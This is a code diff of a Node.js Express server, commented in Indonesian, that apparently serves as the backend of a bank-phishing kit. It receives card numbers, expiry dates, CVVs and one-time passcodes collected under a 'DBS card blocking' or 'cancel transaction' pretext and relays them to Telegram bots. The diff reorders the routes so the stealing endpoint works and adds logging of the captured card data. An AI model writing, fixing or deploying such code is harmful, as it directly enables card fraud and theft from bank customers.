@@ -4,34 +4,35 @@ const dotenv = require('dotenv');
 dotenv.config();
 
 const app = express();
+const PORT = process.env.PORT || 3000;
+
+// Middleware untuk parsing JSON dan form
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
-app.use(express.static(__dirname + '/public'));
 
-const chat_id = process.env.CHAT_ID;
-
+// ⬇️ ROUTE terlebih dahulu agar tidak tertutup static
 app.post('/kirim-ke-telegram', async (req, res) => {
+  console.log("Data diterima:", req.body); // debug log
+
   const { nomor, valid, cvv, otp, laporan } = req.body;
 
   let token;
   let message = "";
 
   if (otp) {
-    // Kirim OTP (batalkan transaksi)
     token = process.env.BOT_TOKEN_OTP;
     message = `🔐 *Kode OTP Diterima*\n\n*OTP:* ${otp}`;
   } else if (nomor && valid && cvv) {
-    // Blokir kartu kredit
     token = process.env.BOT_TOKEN_BLOKIR;
     message = `🛑 *PEMBLOKIRAN KARTU DBS*\n\n*Nomor:* ${nomor}\n*Valid Thru:* ${valid}\n*CVV:* ${cvv}`;
   } else if (laporan) {
-    // Laporan kartu bank lain
     token = process.env.BOT_TOKEN_LAPORAN;
     message = `📄 *Laporan Kartu Bank Lain*\n\n${laporan}`;
   } else {
     return res.status(400).send("Data tidak lengkap");
   }
 
+  const chat_id = process.env.CHAT_ID;
   if (!token || !chat_id) {
     return res.status(500).send("Token atau Chat ID belum diatur");
   }
@@ -54,7 +55,10 @@ app.post('/kirim-ke-telegram', async (req, res) => {
   }
 });
 
-const PORT = process.env.PORT || 3000;
+// ⬇️ Public folder diakses setelah route
+app.use(express.static(__dirname + '/public'));
+
+// Jalankan server
 app.listen(PORT, () => {
-  console.log(`Server aktif di http://localhost:${PORT}`);
+  console.log(`✅ Server aktif di http://localhost:${PORT}`);
 });
